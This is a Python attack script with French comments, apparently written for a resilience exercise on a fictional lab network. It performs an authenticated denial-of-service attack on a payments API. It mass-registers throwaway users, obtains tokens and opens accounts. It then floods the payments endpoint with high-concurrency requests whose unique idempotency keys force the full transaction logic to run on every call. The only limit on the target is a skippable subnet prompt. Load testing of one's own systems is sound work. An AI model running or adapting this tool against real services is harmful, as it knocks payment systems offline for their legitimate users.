#!/usr/bin/env python3
"""
attack_payments.py — Déni de service volumétrique, authentifié, sur /api/payments
PROJECT RESILIENCE-ALPHA — usage strictement limité au SI fictif du consortium
(réseau RESILIENCE-G<n>, 192.168.137.0/24).

Contrairement à un flood anonyme sur une route déjà protégée (/api/auth/login,
limitée à 10 req/min par le WAF/la passerelle), ce script simule un scénario
plus réaliste : un ou plusieurs comptes légitimes (obtenus par inscription)
génèrent un très fort volume de transactions concurrentes sur la vraie route
métier, avec des clés d'idempotence uniques pour forcer l'exécution complète
de la logique métier (payments -> accounts -> ledger) à chaque requête,
plutôt que de retomber sur le chemin rapide d'une clé déjà vue.

Étapes :
    1. Crée N comptes utilisateurs par inscription (POST /api/auth/register).
    2. Connecte chacun pour obtenir un jeton JWT (POST /api/auth/login).
    3. Ouvre 2 comptes bancaires fictifs par utilisateur (POST /api/accounts).
    4. Lance une charge soutenue de paiements entre ces deux comptes, avec un
       nombre de connexions concurrentes élevé, pendant une durée donnée.

Usage :
    python3 attack_payments.py --target http://192.168.137.1:8080 \
                                --users 5 --concurrency 150 --duration 45

Dépendances :
    pip install aiohttp
"""

import argparse
import asyncio
import random
import string
import sys
import time

try:
    import aiohttp
except ImportError:
    sys.exit("Dépendance manquante : pip install aiohttp")


def random_username():
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"stress_{suffix}"


async def register_and_login(session, base_url, username, password):
    async with session.post(f"{base_url}/api/auth/register",
                             json={"username": username, "password": password}) as resp:
        if resp.status not in (201, 409):
            raise RuntimeError(f"Échec inscription {username} : HTTP {resp.status}")

    async with session.post(f"{base_url}/api/auth/login",
                             json={"username": username, "password": password}) as resp:
        if resp.status != 200:
            raise RuntimeError(f"Échec connexion {username} : HTTP {resp.status}")
        data = await resp.json()
        return data["access_token"]


async def open_account(session, base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    async with session.post(f"{base_url}/api/accounts", json={}, headers=headers) as resp:
        if resp.status != 201:
            raise RuntimeError(f"Échec ouverture de compte : HTTP {resp.status}")
        data = await resp.json()
        return data["id"]


async def prepare_identity(session, base_url, index):
    """Crée un utilisateur stress-test avec 2 comptes, prêt à générer du trafic."""
    username = random_username()
    password = "StressTest-" + "".join(random.choices(string.digits, k=6))
    token = await register_and_login(session, base_url, username, password)
    acc_a = await open_account(session, base_url, token)
    acc_b = await open_account(session, base_url, token)
    print(f"[identité {index}] {username} prête (2 comptes ouverts)")
    return {"token": token, "from": acc_a, "to": acc_b}


async def payment_worker(session, base_url, identity, stats, stop_at):
    headers = {
        "Authorization": f"Bearer {identity['token']}",
        "Content-Type": "application/json",
    }
    counter = 0
    while time.monotonic() < stop_at:
        counter += 1
        idem_key = f"{identity['token'][-8:]}-{counter}-{random.randint(0, 999999)}"
        payload = {
            "from_account": identity["from"],
            "to_account": identity["to"],
            "amount": "1.00",
        }
        headers["Idempotency-Key"] = idem_key
        start = time.monotonic()
        try:
            async with session.post(f"{base_url}/api/payments", json=payload,
                                     headers=headers,
                                     timeout=aiohttp.ClientTimeout(total=5)) as resp:
                elapsed = time.monotonic() - start
                stats["latencies"].append(elapsed)
                if resp.status >= 500:
                    stats["errors_5xx"] += 1
                elif resp.status == 429:
                    stats["rate_limited"] += 1
                elif resp.status >= 400:
                    stats["errors_4xx"] += 1
                else:
                    stats["success"] += 1
        except asyncio.TimeoutError:
            stats["timeouts"] += 1
        except Exception:
            stats["conn_errors"] += 1


async def run_attack(target: str, users: int, duration: int, concurrency: int):
    stats = {
        "success": 0, "errors_4xx": 0, "errors_5xx": 0,
        "rate_limited": 0, "timeouts": 0, "conn_errors": 0, "latencies": [],
    }

    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        print(f"[attack] préparation de {users} identité(s) légitime(s)...")
        identities = []
        for i in range(users):
            try:
                identities.append(await prepare_identity(session, target, i + 1))
            except Exception as exc:
                print(f"[attack] échec préparation identité {i + 1} : {exc}")

        if not identities:
            sys.exit("[attack] aucune identité disponible, arrêt.")

        print(f"[attack] {len(identities)} identité(s) prête(s).")
        print(f"[attack] lancement : {concurrency} connexions concurrentes réparties, "
              f"durée {duration}s, cible {target}/api/payments")

        stop_at = time.monotonic() + duration
        per_identity = max(1, concurrency // len(identities))
        tasks = []
        for identity in identities:
            for _ in range(per_identity):
                tasks.append(asyncio.create_task(
                    payment_worker(session, target, identity, stats, stop_at)))

        await asyncio.gather(*tasks)

    total = (stats["success"] + stats["errors_4xx"] + stats["errors_5xx"]
             + stats["rate_limited"] + stats["timeouts"] + stats["conn_errors"])
    avg_latency = sum(stats["latencies"]) / len(stats["latencies"]) if stats["latencies"] else 0

    print("\n[attack] terminé — récapitulatif :")
    print(f"  requêtes totales       : {total}")
    print(f"  paiements réussis      : {stats['success']}")
    print(f"  erreurs 4xx            : {stats['errors_4xx']}")
    print(f"  erreurs 5xx            : {stats['errors_5xx']}")
    print(f"  limitées (429)         : {stats['rate_limited']}")
    print(f"  timeouts               : {stats['timeouts']}")
    print(f"  erreurs de connexion   : {stats['conn_errors']}")
    print(f"  latence moyenne        : {avg_latency:.3f}s")
    print("\n[attack] vérifiez Grafana (latence p95 payments, canary_up) et les alertes.")


def main():
    parser = argparse.ArgumentParser(
        description="Déni de service volumétrique authentifié sur /api/payments — RESILIENCE-ALPHA")
    parser.add_argument("--target", required=True,
                         help="URL de base de l'API, ex. http://192.168.137.1:8080 (sans /api)")
    parser.add_argument("--users", type=int, default=5,
                         help="Nombre d'identités légitimes créées pour générer le trafic (défaut : 5)")
    parser.add_argument("--duration", type=int, default=45, help="Durée en secondes (défaut : 45)")
    parser.add_argument("--concurrency", type=int, default=150,
                         help="Connexions concurrentes totales, réparties entre les identités (défaut : 150)")
    args = parser.parse_args()

    if "192.168.137." not in args.target:
        confirm = input(
            f"[attack] AVERTISSEMENT : la cible '{args.target}' ne semble pas appartenir au "
            f"réseau du consortium (192.168.137.0/24). Confirmez que c'est bien votre SI fictif autorisé. "
            f"Continuer ? [oui/N] "
        )
        if confirm.strip().lower() != "oui":
            print("[attack] annulé.")
            return

    asyncio.run(run_attack(args.target, args.users, args.duration, args.concurrency))


if __name__ == "__main__":
    main()
